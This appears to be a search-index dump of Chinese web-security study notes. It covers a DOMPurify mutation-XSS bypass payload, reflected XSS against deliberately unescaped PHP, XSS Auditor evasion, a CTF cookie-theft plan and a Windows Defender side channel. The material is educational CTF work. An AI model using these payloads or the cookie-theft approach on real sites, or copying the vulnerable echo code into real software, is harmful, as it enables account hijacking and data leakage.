\u4e86\u89e3\u4e00\u4e0bHTML\u8fc7\u6ee4\u5668\uff1a\u5c31\u662f\u7528\u6765\u8fc7\u6ee4\u4e00\u4e9b\u6709\u5bb3\u7684\u8f93\u5165\u7684 \u7a81\u53d8XSS \u00b6 1 <svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\"> \u7ed5\u8fc7\u8fc7\u6ee4\u5668\uff0c\u80fd\u591f\u5b9e\u73b0 self-xss \u901a\u8fc7\u4e00\u4e9b\u7279\u6027\u8ba9 </p> \u9003\u9038\u51fa\u6765 \u4f46\u662f\uff0c\u5f53\u6211\u4eec\u5c1d\u8bd5\u5c06innerHTML\u5206\u914d\u7ed9\u81ea\u8eab\u65f6\uff0c\u2026 \u539f\u7406\u89e3\u6790 \u00b6 <p> \u4f1a\u8dd1\u51fa\u6765 \u6362\u4e00\u79cd\u65b9\u5f0f 1 <svg></p>\u7684payload\u662f\u7a81\u53d8XSS\u7684\u57fa\u7840\uff0c\u56e0\u4e3a\u5b83\u5728\u5206\u914d\u7ed9innerHTML\u65f6\u4f1a\u53d1\u751f\u53d8\u5f02\uff1b\u6700\u521d\u4f4d\u4e8e<svg>\u5185\u7684\u5185\u5bb9\u4f1a\u8df3\u51fa\u3002\u5269\u4e0b\u7684\u6b65\u9aa4\u662f\u5982\u4f55\u5229\u7528\u5b83\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 js\u5728StackOverflow\u4e0a\u95ee\u5f97\u6700\u591a\u7684\u95ee\u9898 jsbin\u5f00\u6e90\u9879\u76ee SCTF2019 WP","title":"Dompurify XSSbypass"},{"location":"web_sec/XSS/DompurifyXSSbypass/#dompurify-xssbypass","text":"math_is_fun\u6e90\u7801 \u4e86\u89e3\u4e00\u4e0bHTML\u8fc7\u6ee4\u5668\uff1a\u5c31\u662f\u7528\u6765\u8fc7\u6ee4\u4e00\u4e9b\u6709\u5bb3\u7684\u8f93\u5165\u7684","title":"Dompurify XSSbypass"},{"location":"web_sec/XSS/DompurifyXSSbypass/#xss","text":"1 <svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\"> \u7ed5\u8fc7\u8fc7\u6ee4\u5668\uff0c\u80fd\u591f\u5b9e\u73b0 self-xss \u901a\u8fc7\u4e00\u4e9b\u7279\u6027\u8ba9 </p> \u9003\u9038\u51fa\u6765 \u4f46\u662f\uff0c\u5f53\u6211\u4eec\u5c1d\u8bd5\u5c06innerHTML\u5206\u914d\u7ed9\u81ea\u8eab\u65f6\uff0c\u2026","title":"\u7a81\u53d8XSS"},{"location":"web_sec/XSS/DompurifyXSSbypass/#_1","text":"<p> \u4f1a\u8dd1\u51fa\u6765 \u6362\u4e00\u79cd\u65b9\u5f0f 1 <svg></p>\u7684payload\u662f\u7a81\u53d8XSS\u7684\u57fa\u7840\uff0c\u56e0\u4e3a\u5b83\u5728\u5206\u914d\u7ed9innerHTML\u65f6\u4f1a\u53d1\u751f\u53d8\u5f02\uff1b\u6700\u521d\u4f4d\u4e8e<svg>\u5185\u7684\u5185\u5bb9\u4f1a\u8df3\u51fa\u3002\u5269\u4e0b\u7684\u6b65\u9aa4\u662f\u5982\u4f55\u5229\u7528\u5b83\u3002","title":"\u539f\u7406\u89e3\u6790"},{"location":"web_sec/XSS/DompurifyXSSbypass/#_2","text":"js\u5728StackOverflow\u4e0a\u95ee\u5f97\u6700\u591a\u7684\u95ee\u9898 jsbin\u5f00\u6e90\u9879\u76ee SCTF2019 WP","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"web_sec/XSS/XSSauditor/","text":"XSS \u00b6 \u4e00\u4e2a\u7ecf\u5178\u7684\u4f8b\u5b50 \u00b6 \u5047\u8bbe\u6709\u4e00\u4e2a\u641c\u7d22\u9875\u9762\uff0c\u5173\u952e\u5b57\u4ee5Get\u65b9\u6cd5\u4f20\u9012\u3002\u5047\u8bbe\uff0c\u641c\u7d22\u9875\u9762\u5728\u8f93\u51fa\u7ed3\u679c\u65f6\u4f1a\u65e0\u8fc7\u6ee4\u7684\u5c06\u7528\u6237\u7684\u5173\u952e\u5b57\u56de\u663e\u5230\u7f51\u9875\u4e0a\uff0c\u5927\u81f4\u903b\u8f91\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 <?php if ( isset ( $_REQUEST [ \"wd\" ])) $wd = $_REQUEST [ \"wd\" ]; if ( $wd ){ echo \"<div>\u5173\u952e\u5b57' $wd '\u641c\u7d22\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</div>\" ; } ?> \u7136\u540e\u641c\u7d22\u8bf7\u6c42\u7684\u94fe\u63a5\u662f: 1 http://localhost/test/haker/xss.php?wd= < script > alert ( \"xss\" )</ script > \u6216\u8005\u4e3a\u4e86\u9690\u853d\u7f16\u4e00\u4e0b\u7801\uff1a 1 http://localhost/test/haker/xss.php?wd=ddd%3Cscript%3Ealert(%22%22)%3C/script%3E \u5982\u679c\u662f\u5728\u51e0\u5e74\u524d\uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u5927\u81f4\u90fd\u4f1a\u5f39\u51fa\u8fd9\u6837\u4e00\u4e2a\u7a97\u53e3\uff1a \u73b0\u5728\uff1a \u662f\u4e71\u7801\uff1f\u6293\u5305\u5427 \u622a\u7136\u4e0d\u540c\uff1f XSS Auditor \u00b6 xss auditor\u662fChrome \u548c Safari\u4e2d\u5185\u5efa\u7684\u4e00\u4e2a\u9632\u5fa1xss\u653b\u51fb\u7684\u529f\u80fd\u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u5ba1\u8ba1\u5668\uff0c\u6709\u9884\u8bbe\u89c4\u5219\uff0c\u4e3b\u8981\u529f\u80fd\u5c31\u662f\u9488\u5bf9\u4e0a\u8ff0\u8fd9\u79cd\u60c5\u51b5\u3002\u6b64\u529f\u80fd\u9ed8\u8ba4\u662f\u5f00\u542f\u7684\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u5173\u95ed\uff0c\u9700\u8981\u5728response header\u4e2d\u663e\u5f0f\u6307\u5b9a\uff1a 1 2 //\u5173\u95ed xss auditor X-XSS-Protection: 0 \u5f53\u7136\uff0c\u66f4\u5f3a\u5927\u7684\u662f\uff0c\u89e6\u53d1\u540e\u8fd8\u53ef\u4ee5\u5c06\u8be6\u60c5\u4e0a\u62a5\uff0c\u4fbf\u4e8e\u5206\u6790\u8ddf\u8e2a\uff1a 1 X-XSS-Protection: 1; report=http://example.com/your_report_URI\u590d\u5236\u4ee3\u7801 \u4e5f\u53ef\u4ee5\u4f7f\u7528block\u6a21\u5f0f\uff1a\u4e00\u65e6\u89e6\u53d1\uff0c\u5f53\u524d\u9875\u9762\u5c31\u4f1a\u7ec8\u6b62\uff0c\u5e76\u540c\u65f6\u5c55\u793a\u4e00\u4e2a\u7a7a\u767d\u9875\u9762\u7ed9\u7528\u6237\uff1a 1 X-XSS-Protection: 1; mode=block\u590d\u5236\u4ee3\u7801 \u5982\u679c\u5c06\u8bf7\u6c42\u6362\u6210post\uff0cxss auditor\u8fd8\u4f1a\u88ab\u89e6\u53d1\u5417\uff1f\u7b54\u6848\u662f\uff1a\u53ef\u4ee5\uff01 XSS Auditor\u7684\u7f3a\u70b9 \u6211\u4eec\u5c06\u540e\u53f0\u903b\u8f91\u6539\u4e00\u4e0b\uff0c\u7ed9\u6bcf\u4e2a\">\"\u540e\u52a0\u4e00\u4e2a\u5206\u53f7\u3002 1 2 3 4 5 6 7 <?php if(isset($_REQUEST[\"wd\"])) $wd=str_replace(\">\",\">;\",$_REQUEST[\"wd\"]); if($wd){ echo \"<div>\u5173\u952e\u5b57'$wd'\u641c\u7d22\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</div>\" } ?>\u590d\u5236\u4ee3\u7801 \u7136\u540e\u4f9d\u7136\u662f\u4e4b\u524d\u7684\u94fe\u63a5\uff0c\u5237\u65b0\uff1a \u6210\u529f\u4e86\uff0c\u5f53\u7136\u672c\u4f8b\u53ea\u662f\u4e00\u4e2a\u8bf4\u660e\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u90fd\u4f1a\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u4e00\u4e9b\u5904\u7406\uff0c\u5982\u679c\u8fd9\u4e9b\u5904\u7406\u5bfc\u81f4\u548c\u63d0\u4ea4\u7684\u5185\u5bb9\u4e0d\u4e00\u6837\u4e86\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u6267\u884c\uff0c\u6bd4\u5982\u50cf\u672c\u4f8b\u4e00\u6837\u3002\u90a3\u4e48xss auditor \u5c31\u65e0\u80fd\u4e3a\u529b\u4e86\u3002\u4e0d\u8fc7xss auditor\u672c\u8eab\u7684\u667a\u80fd\u5ea6\u4e5f\u633a\u9ad8\uff0c\u50cf\u5b57\u7b26\u7f16\u7801\uff0c\u5927\u5c0f\u5199\u53d8\u5316\u8fd9\u79cd\u53d8\u5316\u4f9d\u7136\u8eb2\u4e0d\u8fc7xss auditor\u3002 \u524d\u7aef\u653b\u9632","title":"XSS"},{"location":"web_sec/XSS/XSSauditor/#xss","text":"","title":"XSS"},{"location":"web_sec/XSS/XSSauditor/#_1","text":"\u5047\u8bbe\u6709\u4e00\u4e2a\u641c\u7d22\u9875\u9762\uff0c\u5173\u952e\u5b57\u4ee5Get\u65b9\u6cd5\u4f20\u9012\u3002\u5047\u8bbe\uff0c\u641c\u7d22\u9875\u9762\u5728\u8f93\u51fa\u7ed3\u679c\u65f6\u4f1a\u65e0\u8fc7\u6ee4\u7684\u5c06\u7528\u6237\u7684\u5173\u952e\u5b57\u56de\u663e\u5230\u7f51\u9875\u4e0a\uff0c\u5927\u81f4\u903b\u8f91\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 <?php if ( isset ( $_REQUEST [ \"wd\" ])) $wd = $_REQUEST [ \"wd\" ]; if ( $wd ){ echo \"<div>\u5173\u952e\u5b57' $wd '\u641c\u7d22\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</div>\" ; } ?> \u7136\u540e\u641c\u7d22\u8bf7\u6c42\u7684\u94fe\u63a5\u662f: 1 http://localhost/test/haker/xss.php?wd= < script > alert ( \"xss\" )</ script > \u6216\u8005\u4e3a\u4e86\u9690\u853d\u7f16\u4e00\u4e0b\u7801\uff1a 1 http://localhost/test/haker/xss.php?wd=ddd%3Cscript%3Ealert(%22%22)%3C/script%3E \u5982\u679c\u662f\u5728\u51e0\u5e74\u524d\uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u5927\u81f4\u90fd\u4f1a\u5f39\u51fa\u8fd9\u6837\u4e00\u4e2a\u7a97\u53e3\uff1a \u73b0\u5728\uff1a \u662f\u4e71\u7801\uff1f\u6293\u5305\u5427 \u622a\u7136\u4e0d\u540c\uff1f","title":"\u4e00\u4e2a\u7ecf\u5178\u7684\u4f8b\u5b50"},{"location":"web_sec/XSS/XSSauditor/#xss-auditor","text":"xss auditor\u662fChrome \u548c Safari\u4e2d\u5185\u5efa\u7684\u4e00\u4e2a\u9632\u5fa1xss\u653b\u51fb\u7684\u529f\u80fd\u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u5ba1\u8ba1\u5668\uff0c\u6709\u9884\u8bbe\u89c4\u5219\uff0c\u4e3b\u8981\u529f\u80fd\u5c31\u662f\u9488\u5bf9\u4e0a\u8ff0\u8fd9\u79cd\u60c5\u51b5\u3002\u6b64\u529f\u80fd\u9ed8\u8ba4\u662f\u5f00\u542f\u7684\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u5173\u95ed\uff0c\u9700\u8981\u5728response header\u4e2d\u663e\u5f0f\u6307\u5b9a\uff1a 1 2 //\u5173\u95ed xss auditor X-XSS-Protection: 0 \u5f53\u7136\uff0c\u66f4\u5f3a\u5927\u7684\u662f\uff0c\u89e6\u53d1\u540e\u8fd8\u53ef\u4ee5\u5c06\u8be6\u60c5\u4e0a\u62a5\uff0c\u4fbf\u4e8e\u5206\u6790\u8ddf\u8e2a\uff1a 1 X-XSS-Protection: 1; report=http://example.com/your_report_URI\u590d\u5236\u4ee3\u7801 \u4e5f\u53ef\u4ee5\u4f7f\u7528block\u6a21\u5f0f\uff1a\u4e00\u65e6\u89e6\u53d1\uff0c\u5f53\u524d\u9875\u9762\u5c31\u4f1a\u7ec8\u6b62\uff0c\u5e76\u540c\u65f6\u5c55\u793a\u4e00\u4e2a\u7a7a\u767d\u9875\u9762\u7ed9\u7528\u6237\uff1a 1 X-XSS-Protection: 1; mode=block\u590d\u5236\u4ee3\u7801 \u5982\u679c\u5c06\u8bf7\u6c42\u6362\u6210post\uff0cxss auditor\u8fd8\u4f1a\u88ab\u89e6\u53d1\u5417\uff1f\u7b54\u6848\u662f\uff1a\u53ef\u4ee5\uff01 XSS Auditor\u7684\u7f3a\u70b9 \u6211\u4eec\u5c06\u540e\u53f0\u903b\u8f91\u6539\u4e00\u4e0b\uff0c\u7ed9\u6bcf\u4e2a\">\"\u540e\u52a0\u4e00\u4e2a\u5206\u53f7\u3002 1 2 3 4 5 6 7 <?php if(isset($_REQUEST[\"wd\"])) $wd=str_replace(\">\",\">;\",$_REQUEST[\"wd\"]); if($wd){ echo \"<div>\u5173\u952e\u5b57'$wd'\u641c\u7d22\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</div>\" } ?>\u590d\u5236\u4ee3\u7801 \u7136\u540e\u4f9d\u7136\u662f\u4e4b\u524d\u7684\u94fe\u63a5\uff0c\u5237\u65b0\uff1a \u6210\u529f\u4e86\uff0c\u5f53\u7136\u672c\u4f8b\u53ea\u662f\u4e00\u4e2a\u8bf4\u660e\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u90fd\u4f1a\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u4e00\u4e9b\u5904\u7406\uff0c\u5982\u679c\u8fd9\u4e9b\u5904\u7406\u5bfc\u81f4\u548c\u63d0\u4ea4\u7684\u5185\u5bb9\u4e0d\u4e00\u6837\u4e86\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u6267\u884c\uff0c\u6bd4\u5982\u50cf\u672c\u4f8b\u4e00\u6837\u3002\u90a3\u4e48xss auditor \u5c31\u65e0\u80fd\u4e3a\u529b\u4e86\u3002\u4e0d\u8fc7xss auditor\u672c\u8eab\u7684\u667a\u80fd\u5ea6\u4e5f\u633a\u9ad8\uff0c\u50cf\u5b57\u7b26\u7f16\u7801\uff0c\u5927\u5c0f\u5199\u53d8\u5316\u8fd9\u79cd\u53d8\u5316\u4f9d\u7136\u8eb2\u4e0d\u8fc7xss auditor\u3002 \u524d\u7aef\u653b\u9632","title":"XSS Auditor"},{"location":"web_sec/XSS/googlectf2017joe/","text":"googlectf2017joe \u00b6 \u5c1d\u8bd5\u67e5\u4e86\u4e00\u4e0bXSS\u7684\u6587\u7ae0\uff0c\u53d1\u73b0\u554a\u540e\u591a\u90fd\u6307\u5411\u8fd9\u4e2a\u9898\u76ee\uff0cGoogle\u5b98\u65b9\u5374\u6ca1\u6709\u7ed9\u6e90\u7801\uff1f Googlectf\u7684\u6240\u6709\u9898\u76ee \u5206\u6790\u522b\u4eba\u7684wp \u00b6 \u8fdb\u5165\u9875\u9762\u662f\u4e00\u4e2a\u804a\u5929\u5ba4 \u53ef\u4ee5\u548c\u5b83\u804a\u5929\uff0c\u6539\u540d\u5b57\uff0c\u6c47\u62a5bug \u90a3\u5c31\u6539\u540d\u5b57\uff0c\u6539\u6210\u4e00\u4e2aXSS\u7684\u5e38\u89c1payload \u5237\u65b0\u9875\u9762\u4e4b\u540e\u53ef\u4ee5\u770b\u5230\u4f1a\u628apayload\u5d4c\u5165\u5230HTML\u9875\u9762\u4e2d \u62ff\u8fd9\u5c31\u76f8\u5f53\u4e8e\u81ea\u5df1XSS\u81ea\u5df1\u4e86 \u8fd9\u65f6\u5019\u6ce8\u610f\u5230URL\u4e2d\u6709\u4e00\u4e32\u5f88\u957f\u7684token \u5e76\u4e14\u5728\u9690\u8eab\u9875\u9762\u4e0b(\u4e3a\u4ec0\u4e48\u8981\u5728\u9690\u8eab\u9875\u9762\u4e0b\uff0c\u662f\u4e3a\u4e86\u53bb\u9664\u6389\u6d4f\u89c8\u5668\u7f13\u5b58\u7684\u5f71\u54cd)\u6253\u5f00\u8fd9\u4e2aURL\u4f1a\u767b\u5f55\u5230\u4e4b\u524d\u7684\u90a3\u4e2a\u9875\u9762\u5e76\u4e14XSS\u4e5f\u53ef\u4ee5\u6267\u884c \u4e8e\u662f\u601d\u8def\u5c31\u662f\uff0c\u6211\u4eec\u5728\u91cd\u547d\u540d\u8bbe\u7f6e\u5077cookie\u7684XSS \uff0c\u7136\u540e\u6211\u4eec\u5411\u7ba1\u7406\u5458\u62a5bug \u5e76\u63d0\u4ea4\u6211\u4eeclogin\u7684URL \u3002\u5f53\u7ba1\u7406\u5458\u6253\u5f00URL\u65f6\uff0c\u7531\u4e8e\u90fd\u662f\u540c\u4e2a\u7ade\u8d5b\u9898\u7ad9\u7684\u57df\uff0c\u4e8e\u662f\u6211\u4eec\u5c31\u4f1a\u6536\u5230\u7ba1\u7406\u5458\u7684cookie \u3002 \u53c2\u8003 \u00b6 Google CTF - Joe","title":"googlectf2017joe"},{"location":"web_sec/XSS/googlectf2017joe/#googlectf2017joe","text":"\u5c1d\u8bd5\u67e5\u4e86\u4e00\u4e0bXSS\u7684\u6587\u7ae0\uff0c\u53d1\u73b0\u554a\u540e\u591a\u90fd\u6307\u5411\u8fd9\u4e2a\u9898\u76ee\uff0cGoogle\u5b98\u65b9\u5374\u6ca1\u6709\u7ed9\u6e90\u7801\uff1f Googlectf\u7684\u6240\u6709\u9898\u76ee","title":"googlectf2017joe"},{"location":"web_sec/XSS/googlectf2017joe/#wp","text":"\u8fdb\u5165\u9875\u9762\u662f\u4e00\u4e2a\u804a\u5929\u5ba4 \u53ef\u4ee5\u548c\u5b83\u804a\u5929\uff0c\u6539\u540d\u5b57\uff0c\u6c47\u62a5bug \u90a3\u5c31\u6539\u540d\u5b57\uff0c\u6539\u6210\u4e00\u4e2aXSS\u7684\u5e38\u89c1payload \u5237\u65b0\u9875\u9762\u4e4b\u540e\u53ef\u4ee5\u770b\u5230\u4f1a\u628apayload\u5d4c\u5165\u5230HTML\u9875\u9762\u4e2d \u62ff\u8fd9\u5c31\u76f8\u5f53\u4e8e\u81ea\u5df1XSS\u81ea\u5df1\u4e86 \u8fd9\u65f6\u5019\u6ce8\u610f\u5230URL\u4e2d\u6709\u4e00\u4e32\u5f88\u957f\u7684token \u5e76\u4e14\u5728\u9690\u8eab\u9875\u9762\u4e0b(\u4e3a\u4ec0\u4e48\u8981\u5728\u9690\u8eab\u9875\u9762\u4e0b\uff0c\u662f\u4e3a\u4e86\u53bb\u9664\u6389\u6d4f\u89c8\u5668\u7f13\u5b58\u7684\u5f71\u54cd)\u6253\u5f00\u8fd9\u4e2aURL\u4f1a\u767b\u5f55\u5230\u4e4b\u524d\u7684\u90a3\u4e2a\u9875\u9762\u5e76\u4e14XSS\u4e5f\u53ef\u4ee5\u6267\u884c \u4e8e\u662f\u601d\u8def\u5c31\u662f\uff0c\u6211\u4eec\u5728\u91cd\u547d\u540d\u8bbe\u7f6e\u5077cookie\u7684XSS \uff0c\u7136\u540e\u6211\u4eec\u5411\u7ba1\u7406\u5458\u62a5bug \u5e76\u63d0\u4ea4\u6211\u4eeclogin\u7684URL \u3002\u5f53\u7ba1\u7406\u5458\u6253\u5f00URL\u65f6\uff0c\u7531\u4e8e\u90fd\u662f\u540c\u4e2a\u7ade\u8d5b\u9898\u7ad9\u7684\u57df\uff0c\u4e8e\u662f\u6211\u4eec\u5c31\u4f1a\u6536\u5230\u7ba1\u7406\u5458\u7684cookie \u3002","title":"\u5206\u6790\u522b\u4eba\u7684wp"},{"location":"web_sec/XSS/googlectf2017joe/#_1","text":"Google CTF - Joe","title":"\u53c2\u8003"},{"location":"web_sec/XSS/\u5229\u7528Windows Defender\u4fa7\u4fe1\u9053\u653b\u51fb/","text":"\u5229\u7528windows defender \u00b6 \u5728WCTF 2019\u4e0a\uff0cTokyoWesterns\u8bbe\u8ba1\u4e86\u4e00\u9053\u9898\u76ee\uff0c\u5728\u8fd9\u9053\u9898\u76ee\u4e2d\uff0c\u9700\u8981\u5229\u7528Windows Defender\u5b8c\u6210\u4fa7\u4fe1\u9053\u653b\u51fb\uff0c\u672c\u7bc7\u4e3b\u8981\u662f\u5bf9\u8be5\u5229\u7528\u65b9\u5f0f\u8fdb\u884c\u5206\u6790\u3002 \u8be5\u9898\u76ee\u7684\u8d5b\u540e\u5206\u4eab\u6587\u6863\u89c1\u94fe\u63a5\uff1a https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf Chrome Xss Auditor \u00b6 \u8be5\u9898\u76ee\u4e0e35C3 CTF\u4e0a\u7684FileManager\u7684\u5229\u7528\u601d\u8def\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u90fd\u662f\u901a\u8fc7\u5bf9\u67d0\u79cd\u9632\u5fa1\u673a\u5236\u8fdb\u884c\u4fa7\u4fe1\u9053\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6\u6211\u4eec\u539f\u672c\u65e0\u6743\u83b7\u53d6\u7684\u5185\u5bb9\u3002\u6240\u4ee5\u5148\u6765\u56de\u987e\u4e0b\u8fd9\u4e2a\u9898\u76ee\u7684\u653b\u51fb\u65b9\u6cd5\u3002 \u5728Chrome Xss Audotor\u4e2d\uff0c\u5f53\u68c0\u6d4b\u5230\u8f93\u5165\u4e0e\u8f93\u51fa\u5230\u811a\u672c\u5185\u5bb9\u91cd\u590d\u65f6\uff0c\u4f1a\u5c06\u9875\u9762\u91cd\u5b9a\u5411\u81f3\u5f02\u5e38\u9875\u9762 chrome-error://chromewebdata/ \u3002 \u4ee5\u4e00\u4e2a\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff1a 1 2 3 4 5 6 7 8 <?php $con = @ $_GET [ \"con\" ]; if ( $con === 'con' ){ echo \"<script>var success='success';</script>\" ; } else { echo \"<script>var fail='fail';</script>\" ; } ?> \u82e5GET\u4f20\u8f93\u7684\u53c2\u6570\u4e3a con=con&<script>var success='success';</script> \uff0cPHP\u7684if\u6d41\u7a0b\u4f1a\u8df3\u8f6c\u81f3\u7b2c\u4e00\u4e2a\u5206\u652f\u4e2d\uff0c\u9875\u9762\u4f1a\u8f93\u51fa\uff1a 1 <script>var success='success';</script> \u8fd9\u4e00\u6bb5\u5185\u5bb9\u4e0e\u6211\u4eecGET\u4f20\u8f93\u7684\u5185\u5bb9\u91cd\u590d\u4e86\uff0c\u6b64\u65f6\u4f1a\u89e6\u53d1XSS Auditor\uff0c\u8fdb\u800c\u8df3\u8f6c\u81f3\u5f02\u5e38\u9875\u9762\u3002\u5982\u679cGET\u4f20\u8f93\u7684\u5185\u5bb9\u662f con=cxxx&<script>var success='success';</script> \uff0c\u5219\u8fdb\u5165\u7b2c\u4e8c\u4e2a\u5206\u652f\uff0c\u9875\u9762\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a\uff1a 1 <script>var fail='fail';</script> \u6b64\u65f6\u9875\u9762\u8f93\u51fa\u4e0eURL\u4e2d\u5185\u5bb9\u4e0d\u91cd\u590d\uff0c\u4e0d\u4f1a\u89e6\u53d1XSS Auditor\u3002\u4ee5\u4e0a\u5c31\u662f\u89e6\u53d1XSS Auditor\u7684\u65b9\u6cd5\u3002 \u90a3\u4e48\u5982\u4f55\u5229\u7528\u5b83\u5462\uff1f \u7531\u4e8e\u8fd9\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u901a\u8fc7GET\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u641c\u7d22\u7684\u529f\u80fd\uff0c\u8fd9\u5c31\u548c\u4e0a\u9762\u4f8b\u5b50\u5f88\u76f8\u4f3c\u4e86\uff0c\u4f20\u5165\u7684\u53c2\u6570\u4f1a\u5f71\u54cd\u9875\u9762\u8f93\u51fa\u7684\u811a\u672c\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4e0d\u65ad\u5730\u4fee\u6539\u641c\u7d22\u7684\u5b57\u7b26\u4e32\uff0c\u4fbf\u80fd\u901a\u8fc7XSS Auditor\u7684\u72b6\u6001\u6765\u5224\u65ad\u9875\u9762\u662f\u5426\u771f\u7684\u5b58\u5728\u8fd9\u4e32\u6587\u672c\u3002 Windows Defender \u00b6 \u5bf9Windows Defender\u7684\u4fa7\u4fe1\u9053\u5229\u7528\u4e5f\u662f\u7c7b\u4f3c\u7684\u601d\u60f3\u3002 \u89e6\u53d1Windows Defender \u00b6 \u9996\u5148\u9700\u8981\u660e\u767d\u7684\u662f\uff0cWindows Defender\u7684\u89e6\u53d1\u673a\u5236\u662f\u600e\u6837\u7684\u3002\u5176\u6d41\u7a0b\u5982\u4e0b\uff1a \u68c0\u67e5\u6587\u4ef6\u5185\u5bb9\u4e2d\u662f\u5426\u5b58\u5728\u6076\u610f\u6570\u636e \u5982\u679c\u5b58\u5728\u6076\u610f\u6570\u636e\uff0c\u62d2\u7edd\u7528\u6237\u8bbf\u95ee \u5c06\u6076\u610f\u6570\u636e\u90e8\u5206\u66ff\u6362\u4e3a\u7a7a\u5b57\u8282 (\u5220\u9664\u6587\u4ef6) \u9996\u5148\u9700\u8981\u627e\u5230\u600e\u6837\u7684\u6076\u610f\u6570\u636e\u80fd\u591f\u89e6\u53d1Windows Defender\uff0c\u8fd9\u91ccEICAR\u6d4b\u8bd5\u6587\u4ef6\u4fbf\u53ef\u4ee5\u505a\u5230\u3002\u6bd4\u5982\u8fd9\u4e00\u6bb5\uff1a 1 X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H* mpengine.dll\u662fWindows Defender\u7684\u6838\u5fc3DLL\uff0c\u5176\u4e2d\u5305\u542b\u4e86JScript engine\uff0c\u5728JScript engine\u4e2d\u7ee7\u627f\u4e86\u4e00\u4e9b\u57fa\u7840\u7528\u6cd5\uff0c\u6bd4\u5982\u5b57\u7b26\u4e32\u7d22\u5f15\u64cd\u4f5c\u3001\u6570\u5b66\u64cd\u4f5c\u8fd9\u4e9b\uff0c\u5e76\u4e14\u652f\u6301eval\u51fd\u6570\uff0c\u4f46\u662feval\u7684\u53c2\u6570\u4f1a\u8fdb\u884c\u68c0\u6d4b\uff0c\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u4f20\u5165\u4e0b\u5217js\uff0c\u4fbf\u4f1a\u89e6\u53d1Windows Defender\uff1a 1 eval('X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H*') \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u6784\u601d\u51fa\u653b\u51fb\u65b9\u5f0f\uff0c\u5c06eval\u4e2d\u7684\u7279\u5f81payload\u5206\u5272\u6210\u4e24\u6bb5\uff0c\u6bd4\u5982\uff1a 1 X5O!P%@AP[4\\\\\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H * \u63a5\u4e0b\u6765\u8981\u601d\u8003\u7684\u5c31\u662f\u5982\u4f55\u5e26\u5165\u8fd9\u4e2a * \u4e86\uff0c\u7531\u4e8e\u9898\u76ee\u4e2d\u6211\u4eec\u7684\u76ee\u6807\u662f\u8981\u83b7\u53d6\u5230 /flag \u4e0b\u7684flag\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c06flag\u5b57\u7b26\u4e32\u548c * \u7ed3\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u7528\u6570\u7ec4\u7684\u5f62\u5f0f\uff0c\u6570\u7ec4\u7684\u5f62\u5f0f\u4e3a {c:'*'}[c] \uff0c\u540c\u65f6\u6211\u4eec\u8981\u5c06\u5176\u6539\u5199\u4e3a \u4e0eFlag\u4e2d\u5355\u4e2a\u5b57\u7b26\u76f8\u7b49\u65f6\u8fd4\u56de * \uff0c\u6539\u5199\u7684\u7248\u672c\u4e3a\uff1a 1 {c:'*'}[Math.min(c,n)] n\u4e3a\u83b7\u53d6\u7684Flag\u4e2d\u7684\u67d0\u4e00\u4e2a\u5b57\u7b26\u7ecf\u8fc7charCodeAt\u5904\u7406\u7684\u8fd4\u56de\u503c\uff0c\u800cc\u4e3a\u4e00\u4e2a\u4f1a\u4e0d\u65ad\u53d8\u5316\u7684\u503c\u3002charCodeAt\u7684\u8fd4\u56de\u503c\u8303\u56f4\u57280-65535\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7528\u4e8c\u5206\u7684\u65b9\u6cd5\u6765\u8868\u793ac\uff1a 1 2 3 4 5 6 7 8 l = 0; h = 0x100; while h - l > 1: m = ( h + l ) // 2; if(\u89e6\u53d1): l = m else: h = m \u63a5\u4e0b\u6765\u9700\u8981\u601d\u8003\u7684\u5c31\u662f\u89e6\u53d1\u6761\u4ef6\u662f\u4ec0\u4e48\u4e86\u3002\u7531\u4e8e\u5728Windows Defener\u8bc6\u522b\u5230\u6076\u610f\u6570\u636e\u65f6\uff0c\u4f1a\u8fd4\u56de500\u7981\u6b62\u8bbf\u95ee\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06500\u7684\u72b6\u6001\u4f5c\u4e3aif\u7684\u5224\u65ad\u6761\u4ef6\u3002 \u6700\u7ec8\u7684exp\u4e3a\uff1a 